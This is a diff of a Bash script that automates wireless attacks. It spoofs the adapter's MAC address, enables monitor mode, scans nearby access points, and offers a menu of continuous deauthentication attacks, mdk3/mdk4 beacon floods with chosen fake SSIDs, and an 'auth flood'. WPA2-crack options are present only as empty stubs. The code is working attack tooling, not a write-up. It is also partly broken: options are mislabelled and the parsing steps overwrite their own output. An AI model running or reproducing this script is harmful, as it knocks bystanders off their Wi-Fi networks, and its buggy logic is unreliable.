@@ -79,54 +79,47 @@ sudo cd Desktop
 #user input for a AP's name
 read -p "Enter the AP's name: " AP
 sleep 1
-echo "The AP's name is: $AP"
 #setting up the wireless adapter and other stuff that might interfere with the attack
 echo "setting up the wireless adapter/interfaces"
 sudo ifconfig eth0 down 
 sudo ifconfig wlan0 down 
 sudo macchanger wlan0 
-sudo systemctl stop wpa_supplicant
-sudo systemctl stop NetworkManager
+sudo airmon-ng check kill
 sudo airmon-ng start wlan0
-monitorcheck=$(sudo iwconfig wlan0 mode monitor &> /dev/null && echo "true" || echo "false")
-if [ $monitorcheck == "false" ]; then
-    echo "monitor mode is enabled"
-else
-    echo "monitor mode is not enabled"
-    echo "changing to monitor mode"
-    sudo iwconfig wlan0 mode monitor
-fi
-sudo ifconfig wlan0 up
-
-For_aireplay () {
-    echo "setting up aireplay-ng deauth attack"
-    #deletes the files if they exist so no duplicates
-    #also recommend to use the desktop directory for this
+sudo iwconfig wlan0 up
+Clears_CSV() {
     if [ -e "wlan0-01.csv" ]; then
-        rm wlan0-01.csv
+        sudo rm wlan0-01.csv
         echo "removed wlan0-01.csv"
     else
         echo "no more wlan0-01.csv"
     fi
     if [ -e "bssid.csv" ]; then
-        rm bssid.csv
+        sudo rm bssid.csv
         echo "removed bssid.csv"
     else
         echo "no more bssid.csv"
     fi
     if [ -e "bssid1.csv" ]; then
-        rm bssid1.csv
+        sudo rm bssid1.csv
         echo "removed bssid1.csv"
     else
         echo "no more bssid1.csv"
     fi
     if [ -e "bssid2.csv" ]; then
-        rm bssid2.csv
+        sudo rm bssid2.csv
         echo "removed bssid2.csv"
     else
         echo "no  more bssid2.csv"
     fi
     echo "all files deleted or non existent"
+    sleep 1
+}
+For_aireplay () {
+    echo "setting up aireplay-ng deauth attack"
+    #deletes the files if they exist so no duplicates
+    #also recommend to use the desktop directory for this
+    Clears_CSV
     sleep 1
     echo "starting airodump-ng to find APs, this will take 30 seconds"
     sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
@@ -149,168 +142,173 @@ For_aireplay () {
 
 
 For_mdk3 () {
-    echo "you chose mdk3"
-    read -p "which attack do you want to use? deuth(1) or channel becon flood(2): " attack
-    if [ $attack == 1 ]; then 
-        echo "you chose deauth attack"
-        echo "removing existing csv files"
-        if [ -e "wlan0-01.csv" ]; then
-            rm wlan0-01.csv
-            echo "removed wlan0-01.csv"
-        else
-            echo "no more wlan0-01.csv"
-        fi
-        if [ -e "bssid.csv" ]; then
-            rm bssid.csv
-            echo "removed bssid.csv"
-        else
-            echo "no more bssid.csv"
-        fi
-        if [ -e "bssid1.csv" ]; then
-            rm bssid1.csv
-            echo "removed bssid1.csv"
-        else
-            echo "no more bssid1.csv"
-        fi
-        if [ -e "bssid2.csv" ]; then
-            rm bssid2.csv
-            echo "removed bssid2.csv"
-        else
-            echo "no  more bssid2.csv"
-        fi
-        echo "all files deleted or non existent"
-        echo "starting airodump-ng to find APs, this will take 30 seconds"
-        sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
-        sleep 32
-        # this clears the "," from the csv file
-        cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
-        #this should be the bssid/mac address v
-        cat bssid1.csv | awk '{print $1}' > bssid.csv
-        #this should be the channel v
-        cat bssid1.csv | awk '{print $6}' > bssid.csv
-        #this should be the SSID v
-        #need to test to actually know what column it's in curretly don't know
-        cat bssid1.csv | awk '{print $10}' > bssid.csv
-        cat bssid.csv | awk '{print}'
-        read -p "which AP?: " AP
-        echo "you chose $AP"
-        cat bssid.csv | grep $AP > bssid2.csv
-        cat bssid2.csv | awk '{print $1}' > Black-List.txt
-        channelused=$(cat bssid2.csv | awk '{print $2}')
-        echo "starting mdk3 deauth attack"
-        echo "cancel the attack with ctrl c"
-        sudo mdk3 wlan0 d -c $channelused -b Black-List.txt
-
-    elif [ $attack == 2 ]; then
-        echo "you chose channel becon flood"
+    echo "you chose to use randon SSID beacon flood"
+    while true; do
         read -p "which channel do you want to flood?: " channel
         if [[ -n ${channel//[0-9]/} ]]; then
             echo "invalid input"
-            exit 1
+        else
+            echo "you chose channel $channel"
+            echo "starting mdk3 channel becon flood"
+            echo "cancel the attack with ctrl c"
+            sudo mdk3 wlan0 b -c $channel
+            break
         fi
-        echo "you chose channel $channel"
-        echo "starting mdk3 channel becon flood"
-        echo "cancel the attack with ctrl c"
-        sudo mdk3 wlan0 b -c $channel
-    else
-        echo "invalid input"
-        exit 1
-    fi
+        
+    done
 }
 
 
 For_mdk4 () {
-    echo "you chose mdk4"
-    read -p "which attack do you want to use? deauth(1) or channel becon flood(2): " attack
-    if [ $attack = 1 ];then
-        echo "you chose deauth attack"
-        echo "removing existing csv files"
-        if [ -e "wlan0-01.csv" ]; then
-        rm wlan0-01.csv
-        echo "removed wlan0-01.csv"
-        else
-            echo "no more wlan0-01.csv"
-        fi
-        if [ -e "bssid.csv" ]; then
-            rm bssid.csv
-            echo "removed bssid.csv"
-        else
-            echo "no more bssid.csv"
-        fi
-        if [ -e "bssid1.csv" ]; then
-            rm bssid1.csv
-            echo "removed bssid1.csv"
-        else
-            echo "no more bssid1.csv"
-        fi
-        if [ -e "bssid2.csv" ]; then
-            rm bssid2.csv
-            echo "removed bssid2.csv"
-        else
-            echo "no  more bssid2.csv"
-        fi
-        echo "all files deleted or non existent"
-        echo "starting airodump-ng to find APs, this will take 30 seconds"
-        sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
-        sleep 32
-        # this clears the "," from the csv file
-        cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
-        #this should be the bssid/mac address v
-        cat bssid1.csv | awk '{print $1}' > bssid.csv
-        #this should be the SSID v
-        #need to test to actually know what column it's in curretly don't know
-        cat bssid1.csv | awk '{print $10}' > bssid.csv
-        cat bssid.csv | awk '{print}'
-        read -p "which AP?: " AP
-        echo "you chose $AP"
-        cat bssid.csv | grep $AP > bssid2.csv
-        #this should be the bssid/mac address v
-        usedbssid=$(cat bssid2.csv | awk '{print $1}')
-        echo "starting mdk4 deauth attack"
-        echo "cancel the attack with ctrl c"
-        sudo mdk4 wlan0 d -b $usedbssid
-    elif [ $attack = 2 ]; then
-        echo "you chose channel becon flood"
-        read -p "which channel do you want to flood?: " channel
+    echo "you chose to choose a fake SSID beacon flood"
+    read -p "which SSID/name do you want to use?: " SSID
+    echo "your fake AP is $SSID"
+    while true; do
+    read -p "which channel do you want to use?: " channel
         if [[ -n ${channel//[0-9]/} ]]; then
-            echo "invalid input"
-        e   xit 1
-        else
-            echo "you chose channel $channel"
-        fi
-        read -p "you can make a name for the fake APs, do you want to? (y/n): " name
-        if [ $name == "y" ]; then
-            read -p "what name do you want to use?: " name
-            echo "you chose $name"
-            echo "starting mdk4 channel becon flood"
+        echo "invalid input"
+        else 
+            echo "chosen channel is $channel"
+            echo "starting mdk4 fake SSID beacon flood"
             echo "cancel the attack with ctrl c"
-            sudo mdk4 wlan0 b -n $name -c $channel
-        elif [ $name == "n" ]; then
-            echo "no name chosen, just use mdk3 bruh"
+            sudo mdk4 wlan0 b -n $SSID -c $channel
+            break
+        fi
+    done
+}
+
+For_Analysis () {
+    echo "you chose nearby AP analysis"
+    echo "removing existing csv files"
+    if [ -e "wlan0-01.csv" ]; then
+        sudo rm wlan0-01.csv
+        echo "removed wlan0-01.csv"
+    else
+        echo "no more wlan0-01.csv"
+    fi
+    if [ -e "bssid.csv" ]; then
+        sudo rm bssid.csv
+        echo "removed bssid.csv"
+    else
+        echo "no more bssid.csv"
+    fi
+    if [ -e "bssid1.csv" ]; then
+        sudo rm bssid1.csv
+        echo "removed bssid1.csv"
+    else
+        echo "no more bssid1.csv"
+    fi
+    if [ -e "bssid2.csv" ]; then
+        sudo rm bssid2.csv
+        echo "removed bssid2.csv"
+    else
+        echo "no  more bssid2.csv"
+    fi
+    echo "all files deleted or non existent"
+    sleep 1
+    echo "starting airodump-ng to find APs, this will take 30 seconds"
+    sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
+    sleep 32
+    cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
+    cat bssid1.csv | awk '{print $1}' > bssid.csv
+    cat bssid1.csv | awk '{print $6}' > bssid.csv
+    cat bssid1.csv | awk '{print $10}' > bssid.csv
+    cat bssid.csv | awk '{print}'
+    read -p "which AP?: " AP
+    echo "you chose $AP"
+    cat bssid.csv | grep $AP > bssid2.csv
+    usedbssid=$(cat bssid2.csv | awk '{print $1}')
+    channelused=$(cat bssid2.csv | awk '{print $2}')
+    echo "changing channel to $channelused"
+    sudo iwconfig wlan0 channel $channelused
+    echo "starting aireplay-ng deauth attack"
+    sudo aireplay-ng -0 0 -a $usedbssid wlan0
+}
+
+For_Auth_Flood () {
+    echo "you chose Auth Flood"
+    sleep 1
+    echo "this auth flood will use mkd4"
+    Clears_CSV
+    sleep 1
+    echo "would you like to scan for APs or do you already know its MAC address?"
+    while true; do
+        read -p "1) Scan for APs\n2) Already know MAC address\n3) Exit: " choice
+        if [ $choice == 1 ]; then
+            echo "starting airodump-ng to find APs, this will take 30 seconds"
+            sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
+            sleep 32
+            cat wlan0-01.csv | sed 's/,//g' > bssid.csv
+            cat bssid.csv | awk '{print $1}' > bssid1.csv
+            cat bssid.csv | awk '{print $6}' > bssid1.csv
+            cat bssid.csv | awk '{print $10}' > bssid1.csv
+            cat bssid1.csv | awk '{print}'
+            read -p "which AP?: " AP
+            echo "you chose $AP"
+            # now confirm the AP exists
+
+            cat bssid1.csv | grep $AP > bssid2.csv
+            usedbssid=$(cat bssid2.csv | awk '{print $1}')
+            channelused=$(cat bssid2.csv | awk '{print $2}')
+            echo "changing channel to $channelused"
+            sudo iwconfig wlan0 channel $channelused
+            echo "starting aireplay-ng deauth attack"
+            sudo aireplay-ng -0 0 -a $usedbssid wlan0
+            break
+        elif [ $choice == 2 ]; then
+            read -p "Enter the AP's MAC address: " AP
+            echo "you chose $AP"
+            read -p "Enter the AP's channel: " channel
+            echo "you chose channel $channel"
+            echo "changing channel to $channel"
+            sudo iwconfig wlan0 channel $channel
+            echo "starting aireplay-ng deauth attack"
+            sudo aireplay-ng -0 0 -a $AP wlan0
+            break
+        elif [ $choice == 3 ]; then
             echo "exiting"
             exit 1
         else
             echo "invalid input"
-            exit 1
         fi
-    else
-        echo "invalid input"
-        exit 1
-    fi
+
 }
 
-read -p "which attack do you want to use? aireplay-ng(1), mdk3(2) or mdk4(3): " attack
-if [ $attack == 1 ]; then
-    For_aireplay
-elif [ $attack == 2 ]; then
-    For_mdk3
-elif [ $attack == 3 ]; then
-    For_mdk4
-else
-    echo "invalid input"
-    exit 1
-fi
+For_WPA2_Crack () {
+    echo "you chose WPA2 Crack"
+    
+}
 
+For_Layer1_Deauth () {
+    echo "you chose Layer 1 Deauth"
+    
+}
+
+while true; do
+    echo -e "Which do you want to use?\n1) Layer 2 Deauth\n2) Random SSID beacon flood\n3) Chosen fake SSID beacon flood\n4) Nearby AP analysis\n5) Auth Flood\n6) Layer 1 Deauth\n7) WPA2 Crack\n8) Exit"
+    sleep 1
+    read -p "what's your choice: " attack 
+    if [ $attack == 1 ]; then
+        For_aireplay
+    elif [ $attack == 2 ]; then
+        For_mdk3
+    elif [ $attack == 3 ]; then
+        For_mdk4
+    elif [ $attack == 4 ]; then
+        For_Analysis
+    elif [ $attack == 5 ]; then
+        For_Auth_Flood
+    elif [ $attack == 6 ]; then
+        For_Layer1_Deauth
+    elif [ $attack == 7 ]; then
+        For_WPA2_Crack
+    elif [ $attack == 8 ]; then
+        echo "exiting"
+        exit 1
+    else
+        echo "invalid input, try again"
+    fi
+done
 
 
 
